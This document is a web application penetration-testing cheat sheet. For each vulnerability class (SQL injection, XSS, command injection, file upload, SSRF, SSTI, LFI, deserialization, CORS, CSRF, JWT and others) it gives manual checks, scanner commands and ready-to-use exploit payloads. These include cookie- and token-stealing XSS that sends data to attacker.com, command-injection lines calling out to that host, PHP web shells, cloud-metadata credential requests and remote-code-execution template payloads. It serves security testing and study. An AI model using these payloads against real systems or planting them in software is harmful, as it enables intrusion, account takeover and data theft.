---

---
___

## **RECONNAISSANCE**
*Present on: All web applications*

**Manual:** Browser dev tools, view source, directory guessing
**Automated:**
```bash
subfinder -d target.com | httpx -silent
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ
nuclei -u target.com -t technologies/
```

##  **AUTHENTICATION BYPASS**
*Present when: Poor auth implementation, weak validation logic*

**Manual:** Try default creds, manipulate login flow, check session handling
**Automated:**
```bash
hydra -L users.txt -P pass.txt target.com http-post-form
ffuf -w creds.txt -u target.com/login -X POST -d "user=FUZZ&pass=FUZZ"
```

**Exploit:**
```sql
' OR 1=1--
admin'--
```

##  **SQL INJECTION**
*Present when: User input directly concatenated into SQL queries*
Detailed cheatsheet: [SQL Injection](../../Web%20Application/Injections/SQL%20Injection.md)

**Manual:** Add `'` to parameters, observe errors, test time delays
**Automated:**
```bash
sqlmap -u "target.com/page?id=1" --batch --dbs
ghauri -u "target.com/page?id=1"
```

**Exploit:**
```sql
# Detection
' OR SLEEP(5)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--

# Extraction
' UNION SELECT 1,version(),database()--
' UNION SELECT 1,load_file('/etc/passwd'),3--
```

## **XSS**
*Present when: User input reflected in HTML without proper encoding*
Also see [Cross-Site Scripting (XSS)](../../Web%20Application/Injections/Cross-Site%20Scripting%20(XSS).md)
**Manual:** Insert `<script>alert(1)</script>` in all inputs, check response
**Automated:**
```bash
xsser --url="target.com/search?q=" -p
nuclei -u target.com -t xss/
dalfox url target.com
```

**Exploit:**
```html
<script>alert(document.cookie)</script>
<img src=x onerror=fetch('//attacker.com/'+document.cookie)>
<svg onload=location='//attacker.com/?'+localStorage.getItem('token')>
```

## **COMMAND INJECTION**
*Present when: User input passed to system commands without sanitization*
Also see: [Command Injection](../../Web%20Application/Injections/Command%20Injection.md)
**Manual:** Test with `;`, `&&`, `|` followed by commands like `whoami`
**Automated:**
```bash
commix --url="target.com/ping?host=127.0.0.1"
nuclei -u target.com -t command-injection/
```

**Exploit:**
```bash
; whoami
&& id
| cat /etc/passwd
`curl attacker.com/$(whoami)`
$(nslookup whoami.attacker.com)
```

## **FILE UPLOAD**
*Present when: File uploads lack proper validation and execution prevention*
Also see: [Insecure File Uploads](../../Web%20Application/Insecure%20File%20Uploads.md)
**Manual:** Upload various file types, check execution in upload directory
**Automated:**
```bash
fuxploider --url target.com/upload
nuclei -u target.com -t file-upload/
```

**Exploit:**
```php
# Shell upload
shell.php: <?php system($_GET['cmd']); ?>

# Bypass techniques
shell.php%00.jpg
shell.Php
shell.phtml
GIF89a;<?php system($_GET['cmd']);?>
```

## **SSRF**
*Present when: Application makes requests to user-controlled URLs*

**Manual:** Replace URLs with internal IPs, cloud metadata endpoints
**Automated:**
```bash
ssrfmap -r request.txt -p url -m readfiles
nuclei -u target.com -t ssrf/
```

**Exploit:**
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://127.0.0.1:8080/admin
file:///etc/passwd
gopher://127.0.0.1:6379/_SET test 1
```

## **SSTI**
*Present when: User input embedded in template engines without sandboxing*
Also see: [Server-Side Template Injection (SSTI)](../../Web%20Application/Injections/Server-Side%20Template%20Injection%20(SSTI).md)
**Manual:** Test with `{{7*7}}`, `${7*7}`, observe if calculation occurs
**Automated:**
```bash
tplmap -u "target.com/page?name=test"
nuclei -u target.com -t ssti/
```

**Exploit:**
```python
# Jinja2
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

## **PATH TRAVERSAL/LFI**
*Present when: File paths constructed from user input without validation*
Also see: [Local File Inclusion (LFI)](../../Web%20Application/File%20Inclusion/Local%20File%20Inclusion%20(LFI).md)
**Manual:** Replace filenames with `../../../etc/passwd`, observe responses
**Automated:**
```bash
dotdotpwn -m http -h target.com -x 8080 -f /etc/passwd
nuclei -u target.com -t lfi/
```

**Exploit:**
```
../../../etc/passwd
....//....//....//etc/passwd
php://filter/convert.base64-encode/resource=config.php
php://input (with POST: <?php system($_GET['cmd']);?>)
```

## **INSECURE DESERIALIZATION**
*Present when: Untrusted serialized objects are deserialized*

**Manual:** Look for base64/hex blobs in cookies, параметрs; decode and analyze
**Automated:**
```bash
ysoserial -p CommonsCollections1 -c 'id'
phpggc -l # List gadgets
```

**Exploit:**
```bash
# Java
java -jar ysoserial.jar CommonsCollections1 'id' | base64

# PHP
phpggc Laravel/RCE1 system id | base64

# .NET
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc"
```

## **IDOR**
*Present when: Object IDs in URLs/parameters lack proper authorization checks*
Also see: [Insecure Direct Object Reference (IDOR)](../../Web%20Application/Access%20Control/Insecure%20Direct%20Object%20Reference%20(IDOR).md)
**Manual:** Change numeric IDs, UUIDs, usernames in parameters
**Automated:**
```bash
ffuf -w numbers.txt -u target.com/user/FUZZ -fc 404
authz0 -u target.com -H "Cookie: session=abc"
```

**Exploit:**
```
/user/profile?id=1 → id=2
/api/document/ABC123 → ABC124
/order/user123 → user456
```

## **HTTP REQUEST SMUGGLING**
*Present when: Frontend/backend servers parse HTTP requests differently*

**Manual:** Send conflicting Content-Length/Transfer-Encoding headers
**Automated:**
```bash
smuggler.py -u target.com
httpreqsmuggler target.com
```

**Exploit:**
```http
# CL.TE
POST / HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

## **BUSINESS LOGIC FLAWS**
*Present when: Application workflow can be manipulated for unintended outcomes*

**Manual:** Skip steps, negative values, race conditions, replay attacks
**Automated:**
```bash
# Race condition testing
ffuf -w numbers.txt -u target.com/transfer -X POST -d "amount=1000" -t 50
```

**Exploit:**
```json
{"price": -100}
{"quantity": -1}
{"role": "admin"}
```

##  **CACHE POISONING**
*Present when: Web caches store responses based on manipulable headers*

**Manual:** Modify Host header, X-Forwarded-Host, observe cached responses
**Automated:**
```bash
web-cache-vulnerability-scanner -u target.com
param-miner --target target.com
```

**Exploit:**
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```

## **CORS MISCONFIGURATION**
*Present when: Access-Control headers are overly permissive*

**Manual:** Check if Origin reflects in Access-Control-Allow-Origin
**Automated:**
```bash
corsy -u target.com
nuclei -u target.com -t cors/
```

**Exploit:**
```javascript
// If ACAO: * with credentials
fetch('https://target.com/api/sensitive', {credentials: 'include'})
.then(r=>r.text()).then(d=>fetch('//attacker.com?data='+btoa(d)))
```

## **OPEN REDIRECT**
*Present when: Redirect destinations come from untrusted user input*

**Manual:** Modify redirect parameters to external domains
**Automated:**
```bash
openredirex -l urls.txt
nuclei -u target.com -t redirect/
```

**Exploit:**
```
?redirect=//evil.com
?url=https://evil.com
?next=/\evil.com
?return_to=//evil.com%2e.target.com
```

## **CLICKJACKING**
*Present when: X-Frame-Options/CSP frame-ancestors missing*

**Manual:** Check response headers for frame protection
**Automated:**
```bash
clickjacker -u target.com
nuclei -u target.com -t clickjacking/
```

**Exploit:**
```html
<iframe src="https://target.com/admin/delete?id=123" style="opacity:0.1"></iframe>
<div style="position:absolute;">CLICK HERE FOR FREE MONEY!</div>
```

## **CSRF (CROSS-SITE REQUEST FORGERY)**
*Present when: State-changing requests lack proper anti-CSRF tokens*
[Cross-Site Request Forgery (CSRF)](../../Web%20Application/Request%20Forgery/Cross-Site%20Request%20Forgery%20(CSRF).md)
**Manual:** Remove CSRF tokens, check if requests still work
**Automated:**
```bash
xsrfprobe -u target.com
burp csrf scanner extension
```

**Exploit:**
```html
<form action="https://target.com/transfer" method="POST">
<input name="to" value="attacker">
<input name="amount" value="1000">
</form>
<script>document.forms[0].submit()</script>
```

## **SUBDOMAIN TAKEOVER**
*Present when: DNS points to unclaimed cloud services*

**Manual:** Check CNAME records, try claiming the service
**Automated:**
```bash
subjack -w subdomains.txt -t 100 -timeout 30
nuclei -u target.com -t takeovers/
```

**Exploit:**
```bash
# If CNAME points to unclaimed service
dig subdomain.target.com
# If points to xxx.github.io - claim that GitHub pages
```

## **JWT VULNERABILITIES**
*Present when: JSON Web Tokens lack proper validation*

**Manual:** Decode JWT, modify payload/header, test none algorithm
**Automated:**
```bash
jwt_tool token.jwt -C -d wordlist.txt
jwttool.py -t token.jwt
```

**Exploit:**
```json
# None algorithm
{"alg":"none","typ":"JWT"}

# Algorithm confusion
jwt_tool token.jwt -X k -pk public.pem

# Weak secret
jwt_tool token.jwt -C -d rockyou.txt
```

## **GRAPHQL INJECTION**
*Present when: GraphQL endpoints lack proper input validation*

**Manual:** Send malformed queries, introspection queries
**Automated:**
```bash
graphql-cop -t target.com/graphql
nuclei -u target.com -t graphql/
```

**Exploit:**
```json
# Introspection
{__schema{types{name fields{name type{name}}}}}

# Injection
{user(id: "1' OR 1=1--") {name email}}

# DoS
query {users(first: 99999999) {name}}
```

## **WEBSOCKET VULNERABILITIES**
*Present when: WebSocket connections lack proper authentication/validation*

**Manual:** Connect to WebSocket, send malformed/privileged messages
**Automated:**
```bash
websocket-harness -u ws://target.com/ws
wsrecon target.com
```

**Exploit:**
```javascript
ws = new WebSocket("ws://target.com/ws");
ws.send('{"action":"admin","cmd":"delete_user","id":"victim"}');
```

## **QUICK IDENTIFICATION CHECKLIST**

```bash
# Immediate checks
curl -k https://target.com/robots.txt
curl -k https://target.com/.git/config  
curl -k https://target.com/admin
curl -k -H "Host: evil.com" https://target.com

# Quick tests
echo '"><script>alert(1)</script>' # XSS
echo "' OR 1=1--" # SQL
echo "../../../etc/passwd" # LFI
```

---
